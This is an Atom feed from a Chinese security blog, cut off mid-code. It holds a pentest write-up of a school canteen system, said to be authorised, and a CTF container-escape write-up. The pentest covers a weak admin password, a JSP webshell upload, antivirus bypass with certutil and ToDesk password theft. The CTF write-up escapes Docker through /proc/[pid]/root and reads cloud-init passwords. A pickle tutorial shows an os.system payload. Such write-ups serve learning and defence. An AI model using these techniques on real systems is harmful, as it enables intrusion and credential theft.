<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dr0n&#39;s blog</title>
  
  <subtitle>人生何处不青山</subtitle>
  <link href="https://www.dr0n.top/atom.xml" rel="self"/>
  
  <link href="https://www.dr0n.top/"/>
  <updated>2024-02-29T08:47:27.913Z</updated>
  <id>https://www.dr0n.top/</id>
  
  <author>
    <name>dr0n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>disable_fuctions Bypass 的几种方法</title>
    <link href="https://www.dr0n.top/posts/750a441/"/>
    <id>https://www.dr0n.top/posts/750a441/</id>
    <published>2024-02-26T04:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.913Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="94aa15b4c51f50cefeefa0bd9826f60048fecbb62028607c2829b6e713dc3112">590963d8431f45fd9e51182eaf43787c95fe36a60bf878707a63e6b9c78a8f2a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="php" scheme="https://www.dr0n.top/categories/php/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="php" scheme="https://www.dr0n.top/tags/php/"/>
    
    <category term="disable_fuctions" scheme="https://www.dr0n.top/tags/disable-fuctions/"/>
    
    <category term="LD_PRELOAD" scheme="https://www.dr0n.top/tags/LD-PRELOAD/"/>
    
    <category term="bypass" scheme="https://www.dr0n.top/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>xx市学校食堂原辅材料统一配送管理系统</title>
    <link href="https://www.dr0n.top/posts/62ba3513/"/>
    <id>https://www.dr0n.top/posts/62ba3513/</id>
    <published>2024-02-23T12:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.937Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2023.8月合法授权进行渗透测试，现已修复</p></blockquote><h1 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h1><p>后台发现后直接就是一个弱口令</p><p>admin&#x2F;7654321</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/intranet/intranet-1.png"></p><p>测试后发现公告处存在任意文件上传</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/intranet/intranet-2.png"></p><p>上传一个jsp</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/intranet/intranet-3.png"></p><p>冰蝎连接后直接拿下</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/intranet/intranet-4.png"></p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p>接着进行当前主机的信息收集</p><p>软件：火绒，todesk，360浏览器等<br>OS：Microsoft Windows Server 2016 Standard<br>网段：10.77.0.0&#x2F;24</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/intranet/intranet-5.png"></p><h2 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h2><blockquote><p>看到目标安装了todesk后就突发奇想，想着能不能连接上看看</p></blockquote><p>这里用的方法是上传todesk+nircmd实现远程连接</p><p>Todesk精简版：<a href="https://dl.todesk.com/windows/ToDesk_Lite.exe">https://dl.todesk.com/windows/ToDesk_Lite.exe</a><br>Nircmd: <a href="http://www.nirsoft.net/utils/nircmd.html">http://www.nirsoft.net/utils/nircmd.html</a></p><hr><p>正常情况应该是运行ToDesk_Lite.exe后截图可以直接看到密码，如下图</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/intranet/intranet-7.png"></p><hr><p>但是当时的情况是上传完后截图发现有一个弹窗</p><p>截图命令 <code>nircmd.exe savescreenshot D:\2.png</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/intranet/intranet-6.png"></p><p>比todesk的优先级高，这样会看不到窗口程序，所以需要先杀掉弹窗</p><p>tasklist查看，得到进程名称<code>MusNotificationUx.exe</code><br>杀进程：<code>taskkill /IM &quot;MusNotificationUx.exe&quot;</code></p><p>如果还有其他窗口，可以使用vbs命令清空</p><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vbs"><span class="hljs-keyword">Dim</span> objSHA<br><span class="hljs-keyword">Set</span> objSHA = <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Shell.Application&quot;</span>)<br>objSHA.ToggleDesktop<br><span class="hljs-keyword">Set</span> objSHA = <span class="hljs-literal">Nothing</span><br><br>且火绒不允许创建vbs文件，可以用系统自带的certutil实现bypass<br>certutil -encode <span class="hljs-number">1.</span>vbs <span class="hljs-number">1.</span>txt<br>certutil -decode <span class="hljs-number">1.</span>txt <span class="hljs-number">1.</span>vbs<br></code></pre></td></tr></table></figure><hr><p>清空后再次运行并截图</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/intranet/intranet-8.png"></p><p>因为运行的是系统本身安装的todesk，而不是精简版，所以还需要获取连接密码</p><p>可以找到config.ini文件中的hash，复制到本地，在本地启动todesk拿到密码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/intranet/intranet-9.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/intranet/intranet-10.png"></p><p>至此实现todesk连接</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/intranet/intranet-12.png"></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>就不详细放图了，都是同一网段的</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">AVA互动管理软件x1<br>HDMx1<br>Grandstream GXP1610 企业ip电话管理x4<br>海康威视摄像头x2<br>VBC网络核心智能管理系统x1<br>h3c设备x1<br>主机getshellx3<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;2023.8月合法授权进行渗透测试，现已修复&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;外网&quot;&gt;&lt;a href=&quot;#外网&quot; class=&quot;headerlink&quot; title=&quot;外网&quot;&gt;&lt;/a&gt;外网&lt;/h1&gt;&lt;p&gt;后台发现后直接就是一个弱口</summary>
      
    
    
    
    <category term="内网" scheme="https://www.dr0n.top/categories/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="内网渗透" scheme="https://www.dr0n.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="实战" scheme="https://www.dr0n.top/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>Be-a-Docker-Escaper-4 &amp; Be-a-Cloud-Hacker</title>
    <link href="https://www.dr0n.top/posts/90615d01/"/>
    <id>https://www.dr0n.top/posts/90615d01/</id>
    <published>2024-01-27T05:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.912Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目来自2024年第六届RWCTF体验赛</p></blockquote><p>一道关于容器逃逸的题目</p><h2 id="Be-a-Docker-Escaper-4"><a href="#Be-a-Docker-Escaper-4" class="headerlink" title="Be-a-Docker-Escaper-4"></a>Be-a-Docker-Escaper-4</h2><p>ssh连上后可以通过<code>ps -aux</code>命令看到这个容器的启动命令</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs docker">docker <span class="hljs-keyword">run</span><span class="language-bash"> --<span class="hljs-built_in">rm</span> -it --pid=host --security-opt=apparmor=unconfined ubuntu bash</span><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/docker/docker-e-1.png"></p><p>这里介绍下<code>--pid=host</code>这个参数，指定为host后会使用宿主机的pid namespace。可以通过ps命令看到容器外的进程</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs docker">--pid=<span class="hljs-string">&quot;&quot;</span>  : Set the PID (Process) Namespace mode for the container,<br>             <span class="hljs-string">&#x27;container:&lt;name|id&gt;&#x27;</span>: joins another container<span class="hljs-string">&#x27;s PID namespace</span><br><span class="hljs-string">             &#x27;</span>host<span class="hljs-string">&#x27;: use the host&#x27;</span>s PID namespace inside the container<br></code></pre></td></tr></table></figure><p>因为容器共享了<code>pid</code>，并且关闭了apparmor，所以可以利用某些进程的<code>/proc/[pid]/root</code>符号链接实现容器逃逸</p><p>先找到宿主机上以非 root 用户运行的进程<br>很明显有个sleep进程</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/docker/docker-e-2.png"></p><p>然后在容器中创建一个 UID 和 GID 与目标进程 UID 和 GID 相同的用户<br>这里的uid很明显是1000，gid则需要猜测（基本从1000开始，这一题中是1001）</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/docker/docker-e-3.png"></p><p>最后用 su 命令切换到该用户，就有权限访问目标进程的 &#x2F;proc&#x2F;[pid]&#x2F;root 了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/docker/docker-e-4.png"></p><p>非预期解法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> `find /proc/*/root`; <span class="hljs-keyword">do</span> <span class="hljs-built_in">ls</span> -al <span class="hljs-variable">$fd</span> | grep \&gt;; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="Be-a-Cloud-Hacker"><a href="#Be-a-Cloud-Hacker" class="headerlink" title="Be-a-Cloud-Hacker"></a>Be-a-Cloud-Hacker</h2><p>先提升权限</p><p>创建特权容器</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">apt update<br>apt install docker.io<br># cat /proc/$pid/root/etc/group得到gid为1000，将原来的替换成1000<br>sed -i &#x27;s/docker:x:103:/docker:x:1000:/g&#x27; /etc/group<br>usermod -aG docker exp<br><br>su exp<br>pid=$(pidof sleep)<br>docker -H unix:///proc/$pid/root/run/docker.sock run -it --privileged ubuntu bash<br></code></pre></td></tr></table></figure><p>在特权容器中逃逸</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">mkdir /tmp/m<br>mount /dev/sda1 /tmp/m<br></code></pre></td></tr></table></figure><p>最后找cloud-init的配置文件中的密码就行了（默认在&#x2F;var&#x2F;lib&#x2F;cloud）</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/docker/docker-e-5.png"></p><hr><p>参考文章：<a href="https://www.anquanke.com/post/id/290540">一个未公开的容器逃逸方式</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;题目来自2024年第六届RWCTF体验赛&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;一道关于容器逃逸的题目&lt;/p&gt;
&lt;h2 id=&quot;Be-a-Docker-Escaper-4&quot;&gt;&lt;a href=&quot;#Be-a-Docker-Escaper-4&quot; cl</summary>
      
    
    
    
    <category term="docker" scheme="https://www.dr0n.top/categories/docker/"/>
    
    
    <category term="docker" scheme="https://www.dr0n.top/tags/docker/"/>
    
    <category term="逃逸" scheme="https://www.dr0n.top/tags/%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>python反序列化</title>
    <link href="https://www.dr0n.top/posts/ab2b72a2/"/>
    <id>https://www.dr0n.top/posts/ab2b72a2/</id>
    <published>2024-01-01T01:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.946Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python的序列化和反序列化"><a href="#python的序列化和反序列化" class="headerlink" title="python的序列化和反序列化"></a>python的序列化和反序列化</h1><p>与PHP，Java类似，python的序列化和反序列化就是对象与数据的相互转换，是为了解决对象传输与持久化存储问题</p><p>在Python中序列化一般通过pickle模块和json模块实现</p><p>pickle模块和json模块提供了dumps()、dump()、loads()、load()四个函数</p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>dump()</td><td>对象反序列化到文件对象并存入文件</td></tr><tr><td>dumps()</td><td>对象反序列化为 bytes 对象</td></tr><tr><td>load()</td><td>对象反序列化并从文件中读取数据</td></tr><tr><td>loads()</td><td>从 bytes 对象反序列化</td></tr></tbody></table><p>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示自定义类型</p><h1 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h1><blockquote><p>python序列化和反序列化的过程都是发生在PVM(Pickle Virtual Machine)上的，它是Python标准库中的一部分，由Python的pickle模块提供支持</p></blockquote><p>pvm由指令处理器、栈区和内存区三部分组成</p><ul><li><p>指令处理器：也就是引擎，从流中读取opcode和参数, 并对其进行解释处理. 重复这个动作, 直到遇到.这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回</p></li><li><p>栈区：由Python的list实现, 被用来临时存储数据、参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化的结果</p></li><li><p>内存区：或者称为标签区，由Python的dict实现, 为PVM的整个生命周期提供存储（将反序列化完成的数据以 key-value 的形式储存在memo中，以便后来使用）</p></li></ul><h2 id="PVM-协议"><a href="#PVM-协议" class="headerlink" title="PVM 协议"></a>PVM 协议</h2><p>因为python版本的不同，所以默认使用的协议不同。因为PVM的指令集用的协议有很大的差别，所以不同的python版本序列化出来的数据是有差别的</p><p>可以通过<code>protocol=num</code>来选择opcode的版本，pickle协议是向前兼容的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name=<span class="hljs-string">&#x27;lewiserii&#x27;</span></span>):<br>        self.name = name<br><br><br>test = Test()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] pickle v&#123;&#125;: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i), pickle.dumps(test, protocol=i)))<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">[+] pickle v0: <span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nTest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVname\np6\nVlewiserii\np7\nsb.&#x27;</span><br>[+] pickle v1: <span class="hljs-string">b&#x27;ccopy_reg\n_reconstructor\nq\x00(c__main__\nTest\nq\x01c__builtin__\nobject\nq\x02Ntq\x03Rq\x04&#125;q\x05X\x04\x00\x00\x00nameq\x06X\t\x00\x00\x00lewiseriiq\x07sb.&#x27;</span><br>[+] pickle v2: <span class="hljs-string">b&#x27;\x80\x02c__main__\nTest\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\t\x00\x00\x00lewiseriiq\x04sb.&#x27;</span><br>[+] pickle v3: <span class="hljs-string">b&#x27;\x80\x03c__main__\nTest\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\t\x00\x00\x00lewiseriiq\x04sb.&#x27;</span><br>[+] pickle v4: <span class="hljs-string">b&#x27;\x80\x04\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Test\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\tlewiserii\x94sb.&#x27;</span><br>[+] pickle v5: <span class="hljs-string">b&#x27;\x80\x05\x95/\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Test\x94\x93\x94)\x81\x94&#125;\x94\x8c\x04name\x94\x8c\tlewiserii\x94sb.&#x27;</span><br></code></pre></td></tr></table></figure><p>不同版本间的区别</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">v0 版协议是原始的&quot;人类可读&quot;协议，并且向后兼容早期版本的 Python<br>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容<br>v2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）<br>v3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议<br>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议<br>v5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）<br></code></pre></td></tr></table></figure><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>opcode也就是操作码，是序列化内容的核心，并且 opcode 是单字节的</p><p>在<code>$PYTHON/Lib/pickle.py</code>中可以查看到完整的opcode</p><p>以下是V0协议中一些常见的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python">MARK           = <span class="hljs-string">b&#x27;(&#x27;</span>   <span class="hljs-comment"># 向栈中压入一个 MARK 标记</span><br>STOP           = <span class="hljs-string">b&#x27;.&#x27;</span>   <span class="hljs-comment"># 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值</span><br>POP            = <span class="hljs-string">b&#x27;0&#x27;</span>   <span class="hljs-comment"># 丢弃栈顶对象</span><br>POP_MARK       = <span class="hljs-string">b&#x27;1&#x27;</span>   <span class="hljs-comment"># 丢弃栈顶到最顶层的标记对象</span><br>DUP            = <span class="hljs-string">b&#x27;2&#x27;</span>   <span class="hljs-comment"># 重复的顶部堆栈项目</span><br>FLOAT          = <span class="hljs-string">b&#x27;F&#x27;</span>   <span class="hljs-comment"># 实例化一个 float 对象</span><br>INT            = <span class="hljs-string">b&#x27;I&#x27;</span>   <span class="hljs-comment"># 实例化一个 int 或者 bool 对象</span><br>NONE           = <span class="hljs-string">b&#x27;N&#x27;</span>   <span class="hljs-comment"># 栈中压入 None</span><br>REDUCE         = <span class="hljs-string">b&#x27;R&#x27;</span>   <span class="hljs-comment"># 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈</span><br>STRING         = <span class="hljs-string">b&#x27;S&#x27;</span>   <span class="hljs-comment"># 实例化一个字符串对象</span><br>UNICODE        = <span class="hljs-string">b&#x27;V&#x27;</span>   <span class="hljs-comment"># 实例化一个 UNICODE 字符串对象</span><br>APPEND         = <span class="hljs-string">b&#x27;a&#x27;</span>   <span class="hljs-comment"># 将栈的第一个元素 append 到第二个元素（必须为列表）中</span><br>BUILD          = <span class="hljs-string">b&#x27;b&#x27;</span>   <span class="hljs-comment"># 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()</span><br>GLOBAL         = <span class="hljs-string">b&#x27;c&#x27;</span>   <span class="hljs-comment"># 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈</span><br>DICT           = <span class="hljs-string">b&#x27;d&#x27;</span>   <span class="hljs-comment"># 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果</span><br>EMPTY_DICT     = <span class="hljs-string">b&#x27;&#125;&#x27;</span>   <span class="hljs-comment"># 向栈中直接压入一个空字典</span><br>APPENDS        = <span class="hljs-string">b&#x27;e&#x27;</span>   <span class="hljs-comment"># 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中</span><br>GET            = <span class="hljs-string">b&#x27;g&#x27;</span>   <span class="hljs-comment"># 将 memo[n] 的压入栈</span><br>INST           = <span class="hljs-string">b&#x27;i&#x27;</span>   <span class="hljs-comment"># 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</span><br>LIST           = <span class="hljs-string">b&#x27;l&#x27;</span>   <span class="hljs-comment"># 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表</span><br>EMPTY_LIST     = <span class="hljs-string">b&#x27;]&#x27;</span>   <span class="hljs-comment"># 向栈中直接压入一个空列表</span><br>OBJ            = <span class="hljs-string">b&#x27;o&#x27;</span>   <span class="hljs-comment"># 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，</span><br>PUT            = <span class="hljs-string">b&#x27;p&#x27;</span>   <span class="hljs-comment"># 将栈顶对象储存至 memo[n]</span><br>SETITEM        = <span class="hljs-string">b&#x27;s&#x27;</span>   <span class="hljs-comment"># 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中</span><br>TUPLE          = <span class="hljs-string">b&#x27;t&#x27;</span>   <span class="hljs-comment"># 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果</span><br>EMPTY_TUPLE    = <span class="hljs-string">b&#x27;)&#x27;</span>   <span class="hljs-comment"># 向栈中直接压入一个空元组</span><br>SETITEMS       = <span class="hljs-string">b&#x27;u&#x27;</span>   <span class="hljs-comment"># 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中</span><br></code></pre></td></tr></table></figure><h2 id="处理序列化字节流的过程"><a href="#处理序列化字节流的过程" class="headerlink" title="处理序列化字节流的过程 "></a>处理序列化字节流的过程 <a id="a"></h2><p>这里用一段简短的字节码来演示利用过程:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">cos<br>system<br>(S<span class="hljs-string">&#x27;whoami&#x27;</span><br>tR.<br></code></pre></td></tr></table></figure><p>按照pickle.py中的源码分析处理序列化字节流的过程</p><p><strong>c</strong></p><p>获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_global</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># 读取一行数据，去掉换行符，作为模块名，例子中是os</span><br>    module = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-comment"># 读取下一行数据，作为类名，例子中是system</span><br>    name = self.readline()[:-<span class="hljs-number">1</span>].decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-comment"># 调用find_class</span><br>    klass = self.find_class(module, name)<br>    <span class="hljs-comment"># 获取模块后添加到当前栈中</span><br>    self.append(klass)<br>dispatch[GLOBAL[<span class="hljs-number">0</span>]] = load_global<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>    <span class="hljs-comment"># Subclasses may override this.</span><br>    <span class="hljs-comment"># 在系统审计功能记录pickle.find_class事件，附带参数module和name</span><br>    sys.audit(<span class="hljs-string">&#x27;pickle.find_class&#x27;</span>, module, name)<br><br>    <span class="hljs-comment"># 如果协议版本小于3且开启了fix_imports标志，则进行特殊的名称和模块映射处理</span><br>    <span class="hljs-keyword">if</span> self.proto &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> self.fix_imports:<br>        <span class="hljs-comment"># 如果(module, name)在NAME_MAPPING中，则使用映射的名称代替原名称</span><br>        <span class="hljs-keyword">if</span> (module, name) <span class="hljs-keyword">in</span> _compat_pickle.NAME_MAPPING:<br>            module, name = _compat_pickle.NAME_MAPPING[(module, name)]<br>        <span class="hljs-comment"># 如果module在IMPORT_MAPPING中，则使用映射的模块名代替原模块名</span><br>        <span class="hljs-keyword">elif</span> module <span class="hljs-keyword">in</span> _compat_pickle.IMPORT_MAPPING:<br>            module = _compat_pickle.IMPORT_MAPPING[module]<br><br>    <span class="hljs-comment"># 动态加载指定模块</span><br>    <span class="hljs-built_in">__import__</span>(module, level=<span class="hljs-number">0</span>)<br>    <span class="hljs-comment"># 如果协议版本大于4则使用_getattribute方法获取对象</span><br>    <span class="hljs-keyword">if</span> self.proto &gt;= <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">return</span> _getattribute(sys.modules[module], name)[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># 否则使用getattr方法获取对象</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(sys.modules[module], name)<br><br><span class="hljs-comment"># 与getattr类似</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_getattribute</span>(<span class="hljs-params">obj, name</span>):<br>    <span class="hljs-comment"># 将属性名按照点号（.）进行分割</span><br>    <span class="hljs-keyword">for</span> subpath <span class="hljs-keyword">in</span> name.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        <span class="hljs-keyword">if</span> subpath == <span class="hljs-string">&#x27;&lt;locals&gt;&#x27;</span>:<br>            <span class="hljs-keyword">raise</span> AttributeError(<span class="hljs-string">&quot;Can&#x27;t get local attribute &#123;!r&#125; on &#123;!r&#125;&quot;</span><br>                                 .<span class="hljs-built_in">format</span>(name, obj))<br>        <span class="hljs-keyword">try</span>:<br>            parent = obj<br>            obj = <span class="hljs-built_in">getattr</span>(obj, subpath)<br>        <span class="hljs-keyword">except</span> AttributeError:<br>            <span class="hljs-keyword">raise</span> AttributeError(<span class="hljs-string">&quot;Can&#x27;t get attribute &#123;!r&#125; on &#123;!r&#125;&quot;</span><br>                                 .<span class="hljs-built_in">format</span>(name, obj)) <span class="hljs-keyword">from</span> <span class="hljs-literal">None</span><br>    <span 